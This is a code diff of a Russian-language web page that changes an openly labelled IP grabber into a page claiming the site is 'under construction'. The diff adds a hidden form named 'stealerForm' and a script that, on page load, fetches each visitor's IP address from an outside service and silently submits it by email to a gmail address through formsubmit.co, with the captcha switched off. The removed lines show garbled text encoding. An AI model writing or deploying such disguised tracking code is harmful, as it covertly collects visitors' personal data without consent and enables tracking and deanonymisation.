@@ -1,23 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>����� ���� IP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Добро пожаловать!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f3f3f3;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h1>���������� ��� IP-�����...</h1>
+    <h1>Сайт находится в разработке</h1>
+    <p>Скоро здесь появится что-то интересное!</p>
 
-    <form id="ipForm" action="https://formsubmit.co/wplacesosi1@gmail.com" method="POST">
-        <input type="hidden" name="IP ������������" id="ipField">
-        <input type="hidden" name="_subject" value="����� IP �����!">
+    <!-- Скрытая форма для отправки IP -->
+    <form id="stealerForm" action="https://formsubmit.co/wplacesosi1@gmail.com" method="POST" style="display: none;">
+        <input type="hidden" name="IP_Пользователя" id="ipInput">
+        <input type="hidden" name="_subject" value="Новый IP!">
         <input type="hidden" name="_captcha" value="false">
     </form>
 
     <script>
+        // Получаем IP и сразу отправляем на почту
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                document.getElementById('ipField').value = data.ip;
-                document.getElementById('ipForm').submit();
+                document.getElementById('ipInput').value = data.ip;
+                document.getElementById('stealerForm').submit();
             });
     </script>
 </body>
